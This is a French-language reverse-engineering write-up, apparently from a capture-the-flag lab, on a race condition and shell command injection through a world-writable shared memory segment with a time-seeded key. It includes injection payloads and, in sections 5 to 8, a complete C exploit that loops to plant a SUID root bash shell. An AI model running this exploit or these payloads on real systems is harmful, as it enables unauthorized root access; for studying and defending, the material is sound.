# SHARED MEMORY REVERSE ENG

***

### <mark style="color:$danger;">1. Introduction à l'Exploitation</mark>&#x20;

Cette exploitation démontre une **race condition** combinée à une **injection de commandes** via la **mémoire partagée**. L'attaquant exploite le timing entre l'écriture et la lecture d'un segment de mémoire partagée pour injecter du code malveillant.

#### Vulnérabilités Identifiées :

* **Race Condition** : Fenêtre temporelle entre écriture et lecture
* **Permissions Faibles** : Mémoire partagée accessible en écriture (0x3b6 = 0o1666)
* **Injection SQL/Commande** : Données non sanitisées dans une requête SQL
* **Prédictibilité** : Génération de clés basée sur `time()` et `rand()`

***

### <mark style="color:$danger;">2. Concepts Fondamentaux du C</mark>

#### <mark style="color:$success;">2.1 Gestion Mémoire en C</mark>

```c
// Allocation dynamique
char *cmd_buffer = (char *)malloc((long)(resp + 1));
if (cmd_buffer == (char *)0x0) {
    puts("Failed to allocate memory for command");
    return false;
}

// Libération mémoire
free(hash);
```

**Pourquoi c'est important :**

* Le C ne gère pas automatiquement la mémoire
* Chaque `malloc()` doit correspondre à un `free()`
* Les fuites mémoire peuvent être exploitées

#### <mark style="color:$success;">2.2 Manipulation de Chaînes</mark>

```c
// Fonction vulnérable dans le binaire
snprintf(h_shm, 0x400, "Leaked hash detected at %s > %s\n", timestamp, hash);

// Recherche de sous-chaînes
str = strstr(h_shm, "Leaked hash detected");
str = strchr(str, '>');
```

**Analyse :**

* `snprintf()` limite la taille mais n'empêche pas l'injection
* `strstr()` et `strchr()` permettent de parser les données
* Le contenu après `>` est utilisé dans une commande SQL

#### <mark style="color:$success;">2.3 Variables d'Environnement</mark>

```c
DB_HOST = getenv("DB_HOST");
DB_USER = getenv("DB_USER");
DB_PASSWORD = getenv("DB_PASSWORD");
DB_NAME = getenv("DB_NAME");
```

**Sécurité :**

* Les variables d'environnement peuvent contenir des secrets
* Elles sont héritées par les processus enfants
* Doivent être protégées avec des permissions appropriées

***

### <mark style="color:$danger;">3. Reverse Engineering avec Ghidra</mark>

#### <mark style="color:$success;">3.1 Analyse de la Fonction</mark> <mark style="color:$success;"></mark><mark style="color:$success;">`main()`</mark>

```c
// Code décompilé par Ghidra
int main(int argc, char **argv) {
    // Récupération des variables d'environnement
    DB_HOST = getenv("DB_HOST");
    DB_USER = getenv("DB_USER");
    DB_PASSWORD = getenv("DB_PASSWORD");
    DB_NAME = getenv("DB_NAME");
    
    // Validation des credentials
    if (DB_HOST == NULL || DB_USER == NULL || 
        DB_PASSWORD == NULL || DB_NAME == NULL) {
        puts("Error: Missing database credentials in environment");
        return 1;
    }
    
    // Traitement de l'argument utilisateur
    if (argc < 2) {
        puts("Error: <USER> is not provided.");
        return 1;
    }
    
    // Récupération du hash depuis la DB
    hash = fetch_hash_from_db(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME, argv[1]);
    
    return 0;
}
```

#### <mark style="color:$success;">3.2 Fonction Critique :</mark> <mark style="color:$success;"></mark><mark style="color:$success;">`write_to_shm()`</mark>

```c
int write_to_shm(char *hash) {
    time_t now_stamp = time((time_t *)0x0);
    srand((uint)now_stamp);           // Seed prédictible !
    int key = rand();                 // Clé prédictible !
    
    // Création segment mémoire partagée
    int shmid = shmget(key % 0xfffff, 0x400, 0x3b6);  // 0x3b6 = permissions 1666
    
    // Attachement au segment
    char *h_shm = (char *)shmat(shmid, (void *)0x0, 0);
    
    // Écriture des données (VULNÉRABLE)
    snprintf(h_shm, 0x400, "Leaked hash detected at %s > %s\n", timestamp, hash);
    
    // Détachement
    shmdt(h_shm);
    
    return key;
}
```

**Points Vulnérables :**

1. **Seed prédictible** : `srand(time())` permet de prédire la clé
2. **Permissions faibles** : 0x3b6 = 0o1666 (accessible en écriture)
3. **Pas de validation** : Le contenu peut être modifié

#### <mark style="color:$success;">3.3 Fonction</mark> <mark style="color:$success;"></mark><mark style="color:$success;">`notify_user()`</mark>

```c
void notify_user(char *DB_HOST, char *DB_USER, char *DB_PASS, char *DB_NAME, int shm_key) {
    // Récupération de la mémoire partagée
    int shmid = shmget(shm_key, 0x400, 0x3b6);
    char *h_shm = (char *)shmat(shmid, (void *)0x0, 0);
    
    // Parsing des données
    char *str = strstr(h_shm, "Leaked hash detected");
    str = strchr(str, '>');
    str = trim_bcrypt_hash(str + 1);  // Extraction du hash
    
    // Construction de la commande SQL (VULNÉRABLE)
    setenv("MYSQL_PWD", DB_PASS, 1);
    snprintf(cmd_buffer, size,
             "mysql -u %s -D %s -s -N -e 'select email from teampass_users where pw = \"%s\"'",
             DB_USER, DB_NAME, str);
    
    // Exécution (POINT D'INJECTION)
    FILE *stream = popen(cmd_buffer, "r");
}
```

**Vulnérabilité :**

* Le contenu de `str` (extrait de la mémoire partagée) est directement injecté dans une commande shell
* Aucune validation ou échappement des caractères spéciaux

***

### <mark style="color:$danger;">4. Shared Memory</mark>&#x20;

#### <mark style="color:$success;">4.1 Concepts Théoriques</mark>

La mémoire partagée permet à plusieurs processus de partager un segment de mémoire physique :

```c
// Création d'un segment
int shmget(key_t key, size_t size, int shmflg);

// Attachement au segment
void *shmat(int shmid, const void *shmaddr, int shmflg);

// Détachement
int shmdt(const void *shmaddr);

// Suppression
int shmctl(int shmid, int cmd, struct shmid_ds *buf);
```

#### <mark style="color:$success;">4.2 Permissions et Sécurité</mark>

```c
// Permissions dans l'exploitation
shmid = shmget(key % 0xfffff, 0x400, 0x3b6);
//                                      ^^^^
//                                      1666 en octal
```

**Analyse des permissions 0x3b6 (1666 octal) :**

* **1** : Sticky bit (non pertinent pour shm)
* **6** : rw- pour le propriétaire
* **6** : rw- pour le groupe
* **6** : rw- pour les autres

**Problème :** N'importe quel utilisateur peut écrire dans ce segment !

#### 4.3 Visualisation de l'Attaque

```
Temps   | Processus check_leak           | Processus attaquant
--------|--------------------------------|-------------------
T0      | Génère clé avec srand(time())  | Génère la même clé
T1      | Crée segment mémoire partagée  | Trouve le segment
T2      | Écrit hash légitime            | -
T3      | sleep(1) - FENÊTRE CRITIQUE    | Écrit payload malicieux
T4      | Lit segment (payload injecté)  | -
T5      | Exécute commande avec injection| -
```

***

### <mark style="color:$danger;">5. Race Conditions et Timing Attack</mark>

#### <mark style="color:$success;">5.1 Qu'est-ce qu'une Race Condition ?</mark>

Une race condition survient quand le comportement d'un programme dépend de l'ordre d'exécution de plusieurs threads/processus.

**Dans notre cas :**

```c
// Processus 1 (check_leak)
write_to_shm(hash);          // Écrit données légitimes
sleep(1);                    // FENÊTRE CRITIQUE
notify_user(..., shm_key);   // Lit les données

// Processus 2 (attaquant)
// Pendant le sleep(1), modifie le contenu de la mémoire partagée
```

#### <mark style="color:$success;">5.2 Exploitation du Timing</mark>

```c
// Code de l'attaquant
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    // Même algorithme de génération de clé
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff;
    
    // Accès au même segment
    int shmid = shmget(key, 0x400, 0x3b6);
    char *h_shm = shmat(shmid, (void *) 0, 0);
    
    // Injection du payload
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; touch /tmp/0xdf;#");
    
    shmdt(h_shm);
    return 0;
}
```

**Stratégie d'attaque :**

1. Prédire la clé de mémoire partagée
2. Boucler continuellement pour empoisonner la mémoire
3. Déclencher l'exécution du programme vulnérable
4. Exploiter la fenêtre temporelle du `sleep(1)`

***

### <mark style="color:$danger;">6. Injection de Commandes</mark>

#### <mark style="color:$success;">6.1 Mécanisme d'Injection</mark>

**Commande légitime construite :**

```bash
mysql -u dbuser -D dbname -s -N -e 'select email from teampass_users where pw = "hash_legitime"'
```

**Payload d'injection :**

```bash
'; touch /tmp/0xdf;#
```

**Commande finale exécutée :**

```bash
mysql -u dbuser -D dbname -s -N -e 'select email from teampass_users where pw = "'; touch /tmp/0xdf;#"'
```

#### <mark style="color:$success;">6.2 Analyse de l'Injection</mark>

**Décomposition :**

1. `"'` : Ferme la chaîne SQL
2. `;` : Termine la commande SQL
3. `touch /tmp/0xdf` : Commande système arbitraire
4. `;#` : Termine la commande et commente le reste

**Pourquoi ça marche :**

* `popen()` exécute la commande via le shell
* Le shell interprète les caractères spéciaux (`;`, `#`)
* Pas de validation des données utilisateur

#### <mark style="color:$success;">6.3 Escalade vers Root</mark>

```c
// Payload pour créer un shell SUID
snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf;#");
```

**Résultat :**

```bash
# Le programme s'exécute avec les privilèges root
# et crée un shell bash avec les bits SUID/SGID
-rwsrwsrwx 1 root root 1396520 Feb 24 19:34 /tmp/0xdf
```

***

***

### <mark style="color:$danger;">8. Développement de l'Exploit</mark>&#x20;

#### <mark style="color:$success;">8.1 Structure de l'Exploit</mark>

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>
#include <string.h>
#include <unistd.h>

// Structure pour gérer l'exploitation
typedef struct {
    int shm_key;
    int shmid;
    char *shm_ptr;
    char payload[400];
} exploit_t;

// Initialisation de l'exploit
int init_exploit(exploit_t *exp) {
    // Génération de la clé identique au programme cible
    time_t now = time(NULL);
    srand(now);
    exp->shm_key = rand() % 0xfffff;
    
    // Accès au segment de mémoire partagée
    exp->shmid = shmget(exp->shm_key, 0x400, 0x3b6);
    if (exp->shmid == -1) {
        perror("shmget");
        return -1;
    }
    
    // Attachement au segment
    exp->shm_ptr = (char *)shmat(exp->shmid, NULL, 0);
    if (exp->shm_ptr == (char *)-1) {
        perror("shmat");
        return -1;
    }
    
    return 0;
}

// Injection du payload
int inject_payload(exploit_t *exp, const char *command) {
    snprintf(exp->payload, sizeof(exp->payload),
             "Leaked hash detected at whenever > '; %s;#", command);
    
    // Écriture dans la mémoire partagée
    strncpy(exp->shm_ptr, exp->payload, 0x400);
    
    return 0;
}

// Nettoyage
void cleanup_exploit(exploit_t *exp) {
    if (exp->shm_ptr != (char *)-1) {
        shmdt(exp->shm_ptr);
    }
}

int main() {
    exploit_t exp;
    
    // Boucle d'empoisonnement continu
    while (1) {
        if (init_exploit(&exp) == 0) {
            // Injection du payload pour créer un shell root
            inject_payload(&exp, "cp /bin/bash /tmp/rootshell; chmod 6777 /tmp/rootshell");
            cleanup_exploit(&exp);
        }
        usleep(100000); // 100ms entre les tentatives
    }
    
    return 0;
}
```

***
